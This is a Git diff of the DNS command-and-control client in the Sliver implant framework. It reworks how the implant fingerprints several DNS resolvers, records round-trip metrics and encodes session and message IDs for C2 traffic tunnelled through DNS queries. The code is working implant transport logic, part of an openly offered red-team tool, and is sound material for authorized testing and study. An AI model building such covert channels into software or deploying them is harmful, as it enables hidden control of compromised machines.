@@ -2,7 +2,7 @@ package dnsclient
 
 /*
 	Sliver Implant Framework
-	Copyright (C) 2019  Bishop Fox
+	Copyright (C) 2021  Bishop Fox
 
 	This program is free software: you can redistribute it and/or modify
 	it under the terms of the GNU General Public License as published by
@@ -52,10 +52,13 @@ fallback to Base32 if we detect problems.
 // {{if .Config.DNSc2Enabled}}
 
 import (
+	"crypto/rand"
 	"encoding/binary"
 	"errors"
+	"hash/crc32"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	// {{if .Config.Debug}}
@@ -73,9 +76,8 @@ import (
 const (
 	// Little endian
 	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
-	messageIDBitMask = 0xff000000 // Bitwise mask to get the message ID
 
-	metricsMaxSize = 64
+	metricsMaxSize = 16
 )
 
 var (
@@ -91,15 +93,15 @@ func DNSStartSession(parent string, retry time.Duration, timeout time.Duration) 
 	log.Printf("DNS client connecting to '%s' (timeout: %s) ...", parent, timeout)
 	// {{end}}
 	client := &SliverDNSClient{
-		metrics: map[string][]time.Duration{},
+		metrics:       map[string][]time.Duration{},
+		caseSensitive: map[string]bool{}, // Can we use a case sensitive encoding?
 
-		parent:        "." + strings.TrimPrefix(parent, "."),
-		caseSensitive: false, // Can we use a case sensitive encoding?
-		forceBase32:   false, // Force case insensitive encoding
-		queryTimeout:  timeout,
-		retry:         retry,
-		retryCount:    3,
-		subdataSpace:  254 - len(parent),
+		parent:       "." + strings.TrimPrefix(parent, "."),
+		forceBase32:  false, // Force case insensitive encoding
+		queryTimeout: timeout,
+		retry:        retry,
+		retryCount:   3,
+		subdataSpace: 254 - len(parent),
 
 		base32: encoders.Base32{},
 		base58: encoders.Base58{},
@@ -113,19 +115,19 @@ func DNSStartSession(parent string, retry time.Duration, timeout time.Duration) 
 
 // SliverDNSClient - The DNS client context
 type SliverDNSClient struct {
-	resolver   SystemResolver
+	resolvers  []DNSResolver
 	resolvConf *dns.ClientConfig
-	primary    int
-	metrics    map[string][]time.Duration
 
-	parent        string
-	retry         time.Duration
-	retryCount    int
-	queryTimeout  time.Duration
-	forceBase32   bool
-	caseSensitive bool
-	subdataSpace  int
-	dnsSessionID  uint32
+	metrics       map[string][]time.Duration
+	caseSensitive map[string]bool
+
+	parent       string
+	retry        time.Duration
+	retryCount   int
+	queryTimeout time.Duration
+	forceBase32  bool
+	subdataSpace int
+	dnsSessionID uint32
 
 	base32 encoders.Base32
 	base58 encoders.Base58
@@ -140,11 +142,34 @@ func (s *SliverDNSClient) SessionInit() error {
 	if len(s.resolvConf.Servers) == 0 {
 		return errNoResolvers
 	}
-
+	s.resolvers = []DNSResolver{}
+	for _, server := range s.resolvConf.Servers {
+		s.resolvers = append(s.resolvers, NewGenericResolver(server, s.resolvConf.Port, s.queryTimeout))
+	}
 	// {{if .Config.Debug}}
 	log.Printf("[dns] Found resolvers: %v", s.resolvConf.Servers)
 	// {{end}}
 
+	err = s.getDNSSessionID()
+	if err != nil {
+		return err
+	}
+	s.fingerprintResolvers()
+
+	return nil
+}
+
+// WriteEnvelope - Send an envelope to the server
+func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
+	return nil
+}
+
+// ReadEnvelope - Recv an envelope from the server
+func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
+	return nil, nil
+}
+
+func (s *SliverDNSClient) getDNSSessionID() error {
 	otpMsg, err := s.otpMsg()
 	if err != nil {
 		return err
@@ -156,11 +181,11 @@ func (s *SliverDNSClient) SessionInit() error {
 	// {{if .Config.Debug}}
 	log.Printf("[dns] Fetching dns session id via '%s' ...", otpDomain)
 	// {{end}}
-	a, rtt, err := s.resolver.A(otpDomain)
+	a, rtt, err := s.resolvers[0].A(otpDomain)
 	if err != nil {
 		return err
 	}
-	s.recordMetrics(s.resolver.Address(), rtt)
+	s.recordMetrics(s.resolvers[0].Address(), rtt)
 	if len(a) < 1 {
 		return errInvalidDNSSessionID
 	}
@@ -172,12 +197,7 @@ func (s *SliverDNSClient) SessionInit() error {
 	// {{if .Config.Debug}}
 	log.Printf("[dns] dns session id: %d", s.dnsSessionID)
 	// {{end}}
-
 	return nil
-}
-
-func (s *SliverDNSClient) primaryResolver() string {
-	return s.resolvConf.Servers[s.primary] + ":" + s.resolvConf.Port
 }
 
 func (s *SliverDNSClient) loadResolvConf() error {
@@ -219,28 +239,86 @@ func (s *SliverDNSClient) otpMsg() ([]byte, error) {
 	return proto.Marshal(otpMsg)
 }
 
-// WriteEnvelope - Send an envelope to the server
-func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
-	return nil
-}
-
-// ReadEnvelope - Recv an envelope from the server
-func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
-	return nil, nil
-}
-
 // fingerprintResolver - Fingerprints resolve to determine if we can use a case sensitive encoding
-func (s *SliverDNSClient) fingerprintResolver() {
-
-}
-
-func (s *SliverDNSClient) recordMetrics(resolver string, rtt time.Duration) {
+func (s *SliverDNSClient) fingerprintResolvers() {
 	if s.metrics == nil {
 		s.metrics = make(map[string][]time.Duration)
+		for _, resolver := range s.resolvers {
+			s.metrics[resolver.Address()] = []time.Duration{}
+		}
 	}
-	if _, ok := s.metrics[resolver]; !ok {
-		s.metrics[resolver] = []time.Duration{}
+
+	wg := &sync.WaitGroup{}
+	// {{if .Config.Debug}}
+	log.Printf("[dns] Fingerprinting %d resolver(s) ...", len(s.resolvers))
+	// {{end}}
+	for id, resolver := range s.resolvers {
+		wg.Add(1)
+		go s.fingerprintResolver(wg, id, resolver)
 	}
+	wg.Wait()
+}
+
+// Fingerprints a single resolver to determine if we can use a case sensitive encoding, average
+// round trip time, and if it works at all
+func (s *SliverDNSClient) fingerprintResolver(wg *sync.WaitGroup, id int, resolver DNSResolver) {
+	defer wg.Done()
+
+	// Base32 Benchmark
+	for index := 0; index < metricsMaxSize/2; index++ {
+		finger, fingerChecksum, err := s.fingerprintMsg(id)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] failed to marshal fingerprint msg (%d): %v", id, err)
+			// {{end}}
+			return
+		}
+		domain, err := s.joinSubdata(string(s.base32.Encode(finger)))
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] failed to encode subdata: %s", err)
+			// {{end}}
+			return
+		}
+		data, rtt, err := resolver.A(domain)
+		if err != nil || len(data) < 1 {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] resolver failed: %s", err)
+			// {{end}}
+			return
+		}
+		if fingerChecksum != crc32.ChecksumIEEE(data[0]) {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] error checksum mismatch!")
+			// {{end}}
+			return
+		}
+		s.recordMetrics(resolver.Address(), rtt)
+	}
+}
+
+func (s *SliverDNSClient) fingerprintMsg(id int) ([]byte, uint32, error) {
+	data := make([]byte, 8)
+	rand.Read(data)
+	fingerprintMsg := &dnspb.DNSMessage{
+		Type: dnspb.DNSMessageType_NOP,
+		ID:   s.msgID(uint32(id)), // Take advantage of the variable length encoding
+		Data: data,
+	}
+	msg, err := proto.Marshal(fingerprintMsg)
+	return msg, crc32.ChecksumIEEE(msg), err
+}
+
+// msgID - Combine (OR) DNS session ID with message ID
+func (s *SliverDNSClient) msgID(id uint32) uint32 {
+	return uint32(id<<24) | uint32(s.dnsSessionID)
+}
+
+// WARNING: The metrics map is not mutex'd so you cannot modify it in this
+// method since it'll be executed in a goroutine. The map should already be
+// setup for us so any key error here should panic
+func (s *SliverDNSClient) recordMetrics(resolver string, rtt time.Duration) {
+	// Prepend metrics slice, drop oldest if we have more than metricsMaxSize
 	if len(s.metrics[resolver]) < metricsMaxSize {
 		s.metrics[resolver] = append([]time.Duration{rtt}, s.metrics[resolver]...)
 	} else {
